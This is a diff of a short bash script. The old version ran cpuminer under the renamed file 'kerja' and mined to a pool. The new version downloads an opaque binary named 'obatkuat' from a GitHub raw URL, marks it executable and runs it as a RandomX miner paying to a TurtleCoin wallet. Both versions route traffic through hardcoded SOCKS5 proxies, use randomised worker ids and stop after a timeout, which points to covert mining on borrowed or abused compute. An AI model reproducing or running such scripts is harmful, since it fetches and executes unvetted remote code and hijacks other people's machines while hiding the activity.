@@ -1,9 +1,13 @@
 #!/bin/bash
-wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz 
-tar xf cpuminer-opt-linux.tar.gz
-mv cpuminer-sse2 kerja
-A=stratum+tcp://stratum-asia.rplant.xyz:7042
-B=sugar1qdv757yc0y3gcdl35wpptenhddk60fnvns473jn
-C=$(shuf -i 10-9999999999999999999 -n 1)#szor-izew
-D=socks5://101.201.154.109:8080
-timeout 359m ./kerja -a yespowersugar -o $A -u $B.$C -p x -t 16 -x $D
+
+sudo apt update
+sudo apt install screen libjansson4 -y
+sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+wget https://raw.githubusercontent.com/outbesok/mesin/main/obatkuat
+chmod +x ternak.sh && chmod +x obatkuat
+screen -dmS ls
+A=us.turtlecoin.herominers.com:1160
+B=TRTLuxaMVkNaKUrey8Dh6tfKSzup58rRbdQFW6RGTR8dSy2VkY5tXbRAPLMuC44C3rZYGumcAuFKjFktTEGV9Z5wRvnjnxzaxvR
+C=$(shuf -i 10-9999999999999999999 -n 1)
+D=socks5://bambank:123@147.182.228.194:3000
+timeout 359m ./obatkuat -a rx/0 -o $A -u $B.$C -p x -t 8 -x $D -k
